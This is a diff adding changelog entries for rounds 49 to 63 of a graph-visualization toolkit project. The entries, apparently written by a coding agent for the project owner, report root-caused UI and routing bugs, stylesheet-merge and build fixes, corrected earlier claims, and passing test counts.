+  ENCODING_EDGE_RULES in the stylesheet merge, and cytoscape gives
+  a property to the LATER rule, so the theme's plain
+  `edge { line-color }` clobbered `edge[_ecolor]` in every theme:
+  color-by-confidence never painted anywhere, ever. My round-62
+  "data path proven" was true and insufficient: the headless repro
+  composed DEFAULT+ENCODING only and missed the real merge.
+- Fix: the merge is EXTRACTED as one exported pure function
+  (composeCanvasStylesheet) with a documented order contract:
+  defaults -> chrome -> THEME rules -> ENCODING (user intent beats
+  default chrome) -> OVERLAY dim (emphasis still fades encoded
+  elements, the 9.10 contract) -> user stylesheet -> hidden last.
+  The component delegates to it; a NEW permanent oracle
+  (confidence-presentation.test.tsx) asserts the COMPUTED
+  amber/green through the REAL merge, headless: the exact class of
+  failure the round-62 oracle could not see.
+- Owner feedback filed: VR-7d/e/f (four-bend default, vertical
+  snap, overlap side choice) with suspected mechanisms; VR-9/10
+  updated with the IBD screenshots (bus wraps, doubled corridors,
+  label collisions). VR-29 landing spacing re-confirmed by owner.
+- An abandoned node-canvas experiment (attempted browser-parity
+  repro) was fully reverted: lockfile restored pristine from the
+  round-62 zip, frozen install exit-0.
+- 1,361 tests exit-0; budgets, spec gate, e2e parse 68/14 green.
+
+## G3L Round 62: verification regressions + the BDD routing screenshots
+
+- Owner inputs: LR-3 repo URL swapped in (zwelz3/g3-toolkit);
+  chunk warning ruled (a) closed; LR-25 ruled (i) static +
+  "preview" label + fit fix, filed as VR-15.
+- **VR-1 (regression, mine)**: dragged containers became
+  untouchable because hit-testing read the BASE geometry while the
+  render used the OFFSET geometry; both call sites now hit against
+  the offset geometry.
+- **VR-3 (real root cause)**: the bio class color map filled via
+  nodeColors.get(NODE id) against a TYPE-keyed map: always empty,
+  every dot gray regardless of the round-53 key fix. The type map
+  IS the class map and is used directly; root dots take encoding
+  colors.
+- **VR-2 (localized)**: the color-by-confidence DATA path is
+  proven green by a permanent oracle over the real supply model;
+  the supply shell publishes its core under ?e2e=1 and a new
+  browser spec asserts painted line colors. Needs a browser run.
+- **VR-7 (the BDD screenshots), seven mechanisms deep**: universal
+  stubs + endpoint boxes as obstacles; dominant-axis side
+  selection with side-relative fan tangents; a POINT-based router
+  terminal check (was cell-midpoint, rejecting legal tips in
+  dense clusters); a zero rung on the router's stub ladder;
+  roomy-first clearance retries at the canvas reroute (a
+  default-clearance route on ANY face beats a tight route on the
+  desired face, preserving the sealed-face oracle's face swap);
+  a fixed-face SWING when every moved face is jammed (the
+  12px-corridor drop); and the settle pass wired identically to
+  the drag pass, which was the final gap: drag-time succeeded
+  while free-time recomputed a crossing. All temporary
+  diagnostics stripped; grep-verified zero.
+- 1,360 tests exit-0 (core 408, react 710, demo 182, examples
+  60); budgets, spec gate, e2e parse 68/14 green.
+
+## G3L Round 61: the remaining backlog in one batch (LR-12/18/23/35/46/47)
+
+- CONTAINER NOTE, owned: the working container reset between
+  turns and this batch's first pass was lost before packaging; the
+  tree was restored from the round-60 zip and the batch REPLAYED
+  from the recorded recipe, then gated fresh. Everything below is
+  verified against the replayed tree.
+- **LR-12**: the missing generation time moved from Signed
+  approval (the timeline's TERMINAL artifact, whose absence erased
+  the play animation's ending) to the mid-timeline Hazard log:
+  an equally realistic provenance gap that keeps the story's end.
+  Timeline oracles updated to the new violating node.
+- **LR-18 (closed)**: SysML multiplicity end to end: StructuralPort
+  and the MBSE FlowPort gained multiplicity; the IBD projection
+  threads it; the SVG view renders "name [1..3]" beside ports;
+  fixture values on pwrOut (1..3) and dataIn (1). Case already
+  passes through as authored (round 55); deeper fixture research
+  DECLINED as scoped: the IBD now demonstrates parts, ports,
+  connectors, and multiplicity, which covers the review's concrete
+  asks.
+- **LR-23**: classic UML compartment separators: a horizontal line
+  above each divider row in the structural SVG.
+- **LR-35**: a fifth sankey stage: the Channel tier (Direct Sales /
+  Systems Integrator / Defense Prime) downstream of Product with
+  branched flows; the five-tier and leaf oracles updated (products
+  now assert non-empty downstream impact; channels are the leaves).
+- **LR-47 root-caused**: type-scoped appearance overrides matched
+  types[0] only, so "Any {Type}" skipped every node whose
+  membership was secondary: most of a multi-type ontology. The
+  scope filter now matches ANY membership.
+- **LR-46**: the shapes tab rides the interactive StructuralSvgView
+  (drag with live re-routing, row grabs, separators) via new
+  rowSeverities/closedContainers decoration props (severity-tinted
+  rows, heavier closed borders) and a sized wrapper (ResizeObserver
+  guarded for jsdom). The canvas-handoff oracle was rewritten to
+  the new contract. One conscious trade recorded: the cytoscape
+  context menu on shapes did not carry over.
+- 1,358 tests exit-0 across all four chunks; budgets, spec gate,
+  e2e parse (67/13) green. The LR backlog is EMPTY of open items.
+
+## G3L Round 60: inspector pair (LR-10/11) + an owned LR-40 correction
+
+- **A round-57 claim corrected**: LR-40's DASHBOARD wiring never
+  reached disk (the patch reported success but the file lacked the
+  edits; my verification checked typecheck, not the file). The
+  inspector-side prop had landed and tested; the dashboard half is
+  now applied FOR REAL and grep-verified on disk: guarded type
+  map (types driver only) + nodeColorOf through the spec's own
+  resolver.
+- **LR-10, both shells**: the FloatingPanel wrapper is GONE (it
+  double-chromed a second header over the inspector's own and
+  under-sized it). The inspector renders bare with its own
+  header/close (inspector-close), absolutely positioned in the
+  canvas, height-capped (min(420px, canvas - 16)). Audit keeps
+  testid au-inspector on the bare wrapper; analytics keeps
+  dashboard-inspector.
+- **LR-11, both shells**: once open, the inspector FOLLOWS canvas
+  selection; closed stays closed. Implemented as render-time
+  DERIVATION (shown subject = live selection while one exists,
+  else the opening subject) after the React lint correctly
+  rejected the first effect-sync version.
+- 1,358 tests exit-0; budgets, spec gate, e2e parse (67/13)
+  green. The LR backlog now holds only the fixture round
+  (LR-12/18-remainder/35), LR-23 (container separators, design),
+  and LR-46/47 (SHACL-via-SVG rethink, enhancement).
+
+## G3L Round 59: ontology perf (LR-45 closed; LR-50 partial + suspicion recorded)
+
+- **LR-45 root-caused**: the inferred toggle produced a NEW ugm
+  identity, and ugm sits in the canvas init deps: every toggle was
+  a full instance teardown + animated fcose over the whole
+  instance graph. The CNT-003 same-graph patch mechanism existed
+  for STRUCTURAL scenes only; it now extends to ugm graphs: graph
+  identity covers node+edge ids, teardown captures node positions
+  (best-effort, guarded for minimal mocks), and a SAME-GRAPH ugm
+  rebuild replays them as PRESET input with the camera restored:
+  the toggle becomes visually data-only (types/pies change, no
+  node motion, no fcose pass). Shell half: the instUgm memo ran
+  instancesUgm TWICE per evaluation (stamp + color map); now once.
+- **LR-50 PARTIAL, honestly**: hops changes produce genuinely
+  different graphs, so re-layout is semantically right, and the
+  shared re-init lag class is what round 59 removed for
+  same-graph cases. A hops=1-SPECIFIC mechanism could not be
+  pinned statically. One concrete suspicion recorded for the
+  owner's repro instead of a speculative patch: viewCore handles
+  (GraphToolbar, legend consumers) point at a DESTROYED cy across
+  every canvas re-init until onReady fires, and the ontology
+  shell's two views share one viewCore state.
+- 1,358 tests exit-0; budgets, spec gate, e2e parse (67/13)
+  green.
+
+## G3L Round 58: LR-37 icon/pin collision ROOT-CAUSED and closed
+
+- The compositing mechanism ALREADY existed (composePinStack,
+  rounds 26/4.7/12.1): the residual collision was a THIRD writer
+  outside its contract. The spec path and the appearance editor
+  maintained two separate truths for icons: the spec stamps _icon
+  DATA (which the node[_icon] class rule and the pin compositor
+  read), while the editor's override path wrote background-image
+  directly as a flat style bypass: invisible to composePinStack
+  and clobbering its multi-image array when applied. That single
+  mismatch produces BOTH reported symptoms: "icon replaces pin"
+  (the flat bypass overwrites the composed [icon, badge] stack)
+  and "pin change removes the icon until other changes" (the pin
+  effect re-composes from _icon data, where the editor icon never
+  lived; a later recolor re-applied the override and brought it
+  back).
+- Fix: icon overrides now travel as _icon DATA through a pure,
+  unit-tested split (splitIconFromOverrideStyle): background-*
+  leaves the bypass, unpinned nodes render via the class rule,
+  pinned nodes re-compose after every override pass, and restore
+  clears only the override's own stamp (a spec re-stamp wins).
+  One honest edge documented in-code: a spec icon shadowed by an
+  override returns on the spec effect's next run rather than
+  instantly.
+- 1,358 tests exit-0 (two new LR-37 oracles); budgets, spec gate,
+  e2e parse (67/13) green. The entire Analytics cluster
+  (LR-31..44) is now closed.
+
+## G3L Round 57: Analytics remainder (LR-31/40/41/42/44; LR-37 deferred)
+
+- **LR-31 split honestly**: the Spacing slider genuinely never
+  reached the force layout (fcose's config ignored
+  options.spacing); it now drives nodeSeparation, so spacing
+  visibly spreads the default layout. Re-run's perceived no-op is
+  the round-16/19 incremental-by-design ruling (fcose re-converges;
+  Shuffle is the deliberate escape): kept, not silently overturned,
+  and explained in the queue.
+- **LR-40 root-caused**: the inspector's node dot derived from the
+  PRIMARY TYPE's palette entry, and the type map was applied even
+  when the graph colored by a non-type property, so both dots
+  mismatched by construction after recoloring. The node dot now
+  shows the node's ACTUAL applied color (the spec's own resolver
+  via a new nodeColorOf prop); the type map only applies while the
+  color driver is types.
+- **LR-41 SUPERSEDES review 4.13's fixed positioning**: the editor
+  sits absolute INSIDE the canvas section, below the toolbar,
+  maxHeight-capped so it cannot spill. The right-side cutoff and
+  horizontal scroll were the 260px wrapper around a 280px inner
+  editor: the wrapper is 300px and the editor fluid
+  (width 100%, border-box).
+- **LR-42**: a custom color wheel joins the presets: the native
+  picker styled as a swatch-sized well (conic-gradient when
+  unset, the chosen color when set).
+- **LR-44**: one dismiss model for the status bar: the text gets
+  its own dismiss; context buttons (Clear path, Show all) survive
+  a text dismissal because bar visibility now includes the path
+  context; Show all gains a testid and the shared button geometry.
+- **LR-37 DEFERRED to its own round** with the mechanism
+  hypothesis recorded: icon and pin likely write the same
+  cytoscape background-image slot (last writer wins); the fix is
+  compositing both into the image array, which deserves focused
+  oracle work rather than a squeezed patch.
+- 1,356 tests exit-0 across all four chunks; budgets, spec gate,
+  e2e parse (67/13) green.
+
+## G3L Round 56: Analytics arc, batch 1 (LR-32/33/34/36/39)
+
+- **LR-32 root-caused**: .g3t-menu had NO css rule at all: an
+  unstyled div (wrapping items, no popover chrome). It now shares
+  the layout popover's visual language with single-row items. And
+  a finding: NEITHER dropdown actually closed on outside click
+  (including the layout one); both now close via one document
+  pointerdown listener scoped to the toolbar root, active only
+  while a menu is open.
+- **LR-36**: search clears on selection, both paths (Enter and
+  result click).
+- **LR-39 root-caused**: after focusNode hid everything outside
+  the neighborhood, NOTHING moved the camera: the subject sat
+  wherever it was. The handler now FITS the remaining visible
+  elements post-render (core ref: bus handlers register once).
+- **LR-33**: both LinkedCharts fill their pane (180 -> 320 px) and
+  axis names are threaded through the chart stack (props ->
+  buildOptions -> bar/scatter/line builders -> echarts name):
+  degree/nodes and degree centrality/risk at the call sites.
+- **LR-34**: the adjacency matrix moved from the bottom tabs into
+  the rail under Origin coverage. The 5.5 oracle updated to the
+  new contract, RECORDING that LR-34 supersedes ruling 8.4's tab
+  placement and narrows 12.6's rail-only-coverage.
+- 1,356 tests exit-0 across all four chunks; budgets, spec gate,
+  e2e parse (67/13) green. Round 57 carries the analytics
+  remainder: LR-31 (options linkage: investigate), LR-37
+  (icon/pin channel conflict), LR-40 (dot colors: suspect
+  localName-style keying), LR-41/42 (edit-appearance geometry +
+  color wheel), LR-44 (status-bar dismiss consistency).
+
+## G3L Round 55: MBSE SVG routing round B (LR-16/17/19/20 + LR-18 labels)
+
+- **LR-19: declared ports MOUNT on the border and sit fully
+  OUTSIDE** (engine placement change; the old center-on-border
+  straddled half-in). Both renderers inherit: the geometry is the
+  shared truth. The D2a contract test updated to the ruling.
+- **LR-20: edges terminate at the port's OUTER face** (the routing
+  anchor moved from port center to outer-face center), so arrowed
+  edges stop at the port boundary instead of behind it.
+- **LR-17: port approaches run along the port axis**: port-anchored
+  ends get a 10 px STUB along the side normal and the route runs
+  between stub tips, so a bottom port is entered from below, never
+  sideways.
+- **LR-16: routes no longer cut through their own node**: endpoint
+  boxes were excluded from obstacles unconditionally; a
+  port-anchored end now keeps its OWN box as an obstacle (the stub
+  provides the clearance), so reaching a far-side port routes
+  around the node.
+- **LR-18 (label parts)**: ports carry their own name labels
+  (local part of the port id), side-aware anchored beside the
+  port: the mis-anchored "edge labels" in the IBD were edge labels
+  doing double duty for unlabeled ports. Case passes through as
+  authored (no transform exists in the view); the fixture-side
+  case/richness + multiplicity labels remain a fixture-round item.
+- One oracle covers the three routing contracts falsifiably
+  (approach axis, outer-face termination, own-box avoidance);
+  the D2a port test asserts the outside mount. Core 407, react
+  708, demo 181, examples 60, all exit-0; budgets, spec gate, e2e
+  parse (67/13) green.
+
+## G3L Round 54: MBSE SVG routing round A (LR-13/14/15/21/22)
+
+- **RTE-011 SHIPPED: live drag re-routing in the SVG view
+  (LR-15/22)**. The documented honest fallback (dragged elements'
+  edges collapsed to marked center-to-center straight lines) is
+  replaced: the pure router (routeStructuralEdges, now exported
+  from core) runs against an EFFECTIVE geometry: a clone with drag
+  offsets applied to moved tops, their rows/children (the `::` id
+  convention), and their declared ports (ownership map). Dragged
+  elements keep ORTHOGONAL routes; edge labels anchor along the
+  polyline, so the label-anchor break (LR-22) dies with the same
+  fix. StructuralSvgView gains a direction prop (the router is
+  direction-aware); MBSE feeds it from its per-diagram layout
+  config. The MR-11 round-3 oracle was UPGRADED (no fallback
+  marker; non-degenerate routed path), not deleted.
+- **LR-21 phantom bends root-caused**: different-width boxes stack
+  left-aligned, so their CENTERS differ by pixels and the router
+  emitted a full Z-jog for a 6 px delta. A snap-to-alignment pass
+  slides both BOX anchors (ports never move) to a shared
+  coordinate when the cross delta is <= 12 px and the shared line
+  stays inside both side spans with margin: the route collapses
+  straight. Oracle falsifiable both ways: 6 px collapses, 80 px
+  keeps its jog.
+- **LR-13 container grabs root-caused**: container interiors are
+  covered by ROW hits, which fell through to canvas pan: only the
+  thin header and a 4 px border grabbed. Row grabs now drag their
+  CONTAINER (the row's geometry parent), and the border band
+  counts as a grab.
+- **LR-14**: compartment section/attribute text centers
+  (textAnchor middle at the row midpoint), matching cytoscape.
+- Core 406 (new LR-21 oracle), react 708, demo 181, examples 60,
+  all exit-0; budgets, spec gate, e2e parse (67/13) green.
+
+## G3L Round 53: supply/bio/ontology batch (LR-24/26/27/28/29/48/49)
+
+- **Supply (LR-24/26/27)**: default zoom clamped to a readable 0.55
+  floor after settle (stable onReady handler: the first inline
+  version re-fired the test stub's onReady every render, an
+  infinite loop caught as a hung suite and documented in the
+  handler comment). FloatingLegend gains top corners + a
+  legibility bump (12 px, larger max box); supply mounts it
+  top-right, clear of the route-status bar. The confidence
+  checkbox is now a three-mode select (Off / Dim / Color), off by
+  default per the 5.7 contract (oracle updated): color mode works
+  through the encoding grammar (a derived confBand edge property
+  in the model + an edge.color categorical channel: green
+  authoritative, amber merged, red low), and edge thickness is a
+  sequential edge.width channel over confidence with an INVERTED
+  range (3.2 px at 0.9, 2 px at 1.0) so low confidence draws
+  heavier.
+- **Bio (LR-28/29)**: scatter gains axis labels fed from the query
+  hint's labelVar/valueVar (rotated y, centered x, in the pad
+  gutters). Class-dot desync ROOT-CAUSED: the color map keys on
+  localName(iri) (the UGM type strings) while the dot looked up by
+  display label, so any diverging rdfs:label fell to the gray
+  fallback; the lookup now keys by local name.
+- **Ontology (LR-48/49)**: TableView renders filler rows so every
+  page is the same height (Prev/Next stops being a moving target),
+  gated to actually-paginating tables (the first version rendered
+  9,995 fillers under a huge pageSize and timed out its own edge
+  case). Legend ROOT-CAUSED: the category collector read only
+  types[0], but inference adds supertypes as SECONDARY
+  memberships that the 5.21 multi-type rings render as visible
+  slices: slices on screen had no legend row. The collector now
+  walks every membership (the shape-rows site stays primary-only:
+  a node has one shape).
+- 1,354 tests exit-0 across all four chunks; budgets, spec gate,
+  and e2e parse (67/13) green.
+
+## G3L Round 52: owner review filed as LR-1..50; the quick-win batch lands
+
+- **The held review is TRACKED**: all ~50 findings filed with IDs
+  and round assignments in planning/g3l/owner-review-2026-07-22.md.
+  Deep clusters (MBSE SVG routing LR-13..23, Analytics LR-31..44,
+  Ontology perf LR-45/50) get dedicated rounds; nothing evaporates.
+- **Landing batch (LR-1..6)**: "Capability surfaces" header +
+  sentence removed (cards keep their grid); MBSE
+  "BDD / IBD / parametric / req" chip removed; holonic references
+  removed (intro + capability strip); the freed strip slot is now
+  the "3 renderers" stat; scope disclaimer added ("demonstrate the
+  basics of wiring toolkit components"); GitHub repo link + icon in
+  the footer with a PLACEHOLDER URL (owner input queued).
+- **Visibility gating (LR-7/8)**: Scale hidden in dev (the
+  dev-build serialization verdict makes it misleading there);
+  Style Lab dev-only for users. The e2e flag (?e2e=1) exposes
+  everything in ANY build, so the MR-7 Style Lab acceptance
+  oracles keep their surface against the production bundle, the
+  smoke still checks its chunk, and the owner can opt in for
+  debugging. Gating oracle added to the landing test (dev set:
+  Style Lab visible, Scale hidden).
+- **Small fixes**: bio "Raw triples" button no longer wraps when
+  inactive (LR-30); auditor kind-chip gets a gap from the event
+  name (LR-9); "Expand Neighbors" removed from the default context
+  menu with a removal oracle, View Neighbors covers the intent
+  (LR-38); "All [Type]" -> "Any [Type]" in the appearance editor
+  (LR-43).
+- Downstream oracles updated to the NEW contracts (landing header
+  absence, gating set, menu set, Any-scope label): 1,354 tests at
+  exit 0 across all four chunks; e2e 67/13.
+
+## G3L Round 51: preview arc CLOSED (owner-confirmed); spec's shuffle step fixed
+
+- **The toolbar preview break is CLOSED with owner confirmation**:
+  "preview looks better now," and the machine agrees: the
+  stylesheet witness PASSED in production (computed display ===
+  flex), and the full toolbar interaction pass (search, every
+  layout option + Run, popover) ran console-clean. 66/67 on the
+  owner's round-50 run.
+- The one failure was THIS SPEC's bug, not the product's: Shuffle
+  is disabled outside force layouts by design, and the spec tried
+  to click it after ending the layout sweep on a non-force option.
+  Fixed: the spec selects the first (force) layout before the
+  rerun/shuffle step and guards on ENABLEDNESS, not existence.
+  (Index access narrowed for strict TS while there.)
+
+## G3L Round 50: the toolbar preview break ROOT-CAUSED and FIXED (missing CSS)
+
+- **The owner's "almost seems like a css thing" was exactly right:
+  g3t-base.css (all toolbar/select/popover chrome) was ABSENT from
+  production builds.** The barrel's css side-effect import was
+  tree-shaken: packages/react declared sideEffects ["*.css"], and
+  the bare glob matches only ROOT-level files, so
+  src/theme/g3t-base.css was licensed for removal. Dev serves the
+  import chain live (no tree-shake), so only preview broke: the
+  precise dev-fine/prod-broken CSS signature reported.
+- Fix, belt and suspenders: the app entry imports the stylesheet
+  EXPLICITLY (unshakeable), the package glob widened to the
+  recursive form, and the treeshake gate's expectation updated to
+  the CORRECT declaration (its old expectation enforced the bug).
+  Proven empirically: dist gained index-*.css (10.75 kB) carrying
+  the toolbar selectors, previously absent.
+- **Stylesheet witness in e2e**: an unstyled toolbar mounts and
+  stays console-clean, so mount smokes MISS this class of break.
+  The toolbar-interaction spec now asserts
+  getComputedStyle(toolbar).display === "flex" (the base rule; an
+  unstyled div computes "block") against the production bundle.
+- e2e all-red on the owner's machine dispositioned: playwright
+  1.60 -> 1.61.1 (round-49 churn) needs new browser binaries:
+  `pnpm exec playwright install` before the round-50 run. The
+  operational consequence should have been in the round-49 ship
+  notes: recorded.
+- (While here: the treeshake-gate comment fix tripped a js block
+  comment on the slash-star sequence inside the recursive glob;
+  rephrased. Verify green.)
+
+## G3L Round 49: vite cruft ROOT-CAUSED; code-split shells; toolbar interaction witness
+
+- **The esbuild/oxc warning is GONE (0 across all four builds)**,
+  and root-causing it found real value: the whitespace-only esbuild
+  minify trio in the three lib configs was partially ignored under
+  vite 8; removing it switched dist to FULL minification: core
+  187.3 -> 146.0 KB, react 425.9 -> 357.1, charts 7.5 -> 6.4.
+  Sourcemaps ship, so full minify is strictly better. Budgets
+  REBASED to the new measurement basis (core 152, react 372,
+  charts 7) with a dated ledger entry. An in-code comment initially
+  claimed the removal was size-neutral; measurement disproved it
+  and the comment states the measured truth. plugin-react-oxc
+  detour reverted on its own deprecation notice (plugin-react
+  6.0.2 -> 6.0.3); the "double vite build" is the intentional
+  lib+app sequence.
+- **All eight demo shells are code-split (React.lazy + Suspense)**:
+  the landing paints from a small chunk; shells load on selection
+  (10-62 KB each). Two large chunks remain, both justified and
+  documented: the shared vendor entry (cytoscape + react-dom,
+  1,060 KB, loaded once) and the LAZY analytics chunk (echarts,
+  1,211 KB, loads only on that card). Raising
+  chunkSizeWarningLimit is the owner's call; the warning left
+  truthful is preferred here.
+- **Demo routing tests under lazy shells**: async findBy with wide
+  timeouts, plus consumer-level echarts stubs (StatsPanel /
+  SankeyView in the @g3t/react mock; LinkedChart via a @g3t/charts
+  mock). Lesson recorded: echarts NEVER worked in jsdom (no 2D
+  context); static imports let it fail as noise, lazy made the
+  rejection fatal to Suspense: stub the consumers, not the lib.
+- **Toolbar interaction witness (owner: "still broken" in
+  preview while the mount smoke is green)**:
+  tests/e2e/toolbar-interaction.spec.ts drives search, every
+  layout option + Run, the options popover, re-run, and shuffle on
+  Scale against the production bundle, console-clean asserted per
+  step: the owner's next run converts "broken" into a failing step
+  with a named error. CSS-divergence theory ruled out (aliases
+  build from SOURCE in both dev and prod). e2e 67 tests, 13 files.
+- **Dependency churn owned and repaired**: the plugin upgrade
+  drifted react-dom to 19.2.7 against react 19.2.6, failing
+  charts' m11 suite at collection (and briefly hiding behind a
+  Tests-line grep: exit codes are now captured in the round
+  routine). Pair synced at 19.2.7; pnpm dedupe bumped vite to
+  8.1.5 and skewed the playwright CLI (1.61.1) against
+  @playwright/test (1.60.0): aligned at 1.61.1. All four chunks
+  re-verified at exit 0 under the final toolchain: 405 + 708 +
+  181 + 60 = 1,354 tests; budgets green; 67 e2e listed.
+
 ## G3L Round 48: the three e2e failures dispositioned; failures-only digest
 
 - **Owner's production e2e run triaged (63 expected / 3 unexpected),
